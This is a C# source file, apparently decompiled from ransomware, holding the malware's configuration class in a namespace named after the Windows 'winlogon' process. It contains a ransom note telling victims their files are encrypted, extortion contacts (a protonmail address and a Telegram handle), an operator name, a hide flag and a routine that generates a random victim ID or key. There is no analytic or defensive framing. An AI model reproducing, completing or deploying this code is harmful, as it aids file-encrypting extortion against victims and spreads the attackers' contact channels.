using System.Security.Cryptography;
using System.Text;

namespace winlogon;

internal class config
{
	public static readonly string Soldier = "Mehran";

	public static readonly string Email_1 = "decryptfile25@protonmail.com";

	public static readonly string Email_2 = "decryptfile25@protonmail.com";

	public static readonly string Readme_Text = " [+] All Your Files Have Been Encrypted [+]\r\n [-] Do You Really Want To Restore Your Files?\r\n [+] Write Us To The E-Mail : _em1_\r\n [+] Write Us To The ID-Telegram : @Book545\r\n [+] If you did not get any response until 24 hours later,Write to this E-Mail : _em2_\r\n [-] Write Your Unique-ID In The Title Of Your Message.\r\n [+] Unique-ID : _pcid_\r\n";

	public static readonly int Hide = 0;

	public static string GetUniqueKey(int maxSize)
	{
		char[] array = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890".ToCharArray();
		byte[] array2 = new byte[1];
		using (RNGCryptoServiceProvider rNGCryptoServiceProvider = new RNGCryptoServiceProvider())
		{
			rNGCryptoServiceProvider.GetNonZeroBytes(array2);
			array2 = new byte[maxSize];
			rNGCryptoServiceProvider.GetNonZeroBytes(array2);
		}
		StringBuilder stringBuilder = new StringBuilder(maxSize);
		byte[] array3 = array2;
		foreach (byte b in array3)
		{
			stringBuilder.Append(array[(int)b % array.Length]);
		}
		return stringBuilder.ToString();
	}
}
